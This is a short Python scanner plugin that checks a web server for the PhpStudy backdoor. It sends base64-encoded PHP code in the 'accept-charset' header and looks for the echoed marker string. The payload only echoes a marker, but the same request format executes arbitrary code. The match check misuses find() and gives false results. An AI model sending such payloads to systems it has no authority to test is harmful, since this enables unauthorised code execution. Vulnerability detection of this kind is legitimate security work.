# encoding: utf-8
from lib import *
import logging
from lib.Urldeal import umethod
import requests

def PhpStudy_BackDoor(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Sec-Fetch-Site': 'none',
        'accept-charset': 'ZWNobyBlZVN6eHU5Mm5JREFiOw==',  # 输出 eeSzxu92nIDAb
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }
    try:
        res = requests.get(urldata, headers=headers, timeout=20)
        if res.status_code == 200:
            if res.text.find('eeSzxu92nIDAb'):
                print(Vcolors.RED + "[!] 存在Phpstudy后门漏洞\r" + Vcolors.ENDC)
    
    except Exception as e :
        logging.error("PhpStudy_BackDoor脚本出现异常")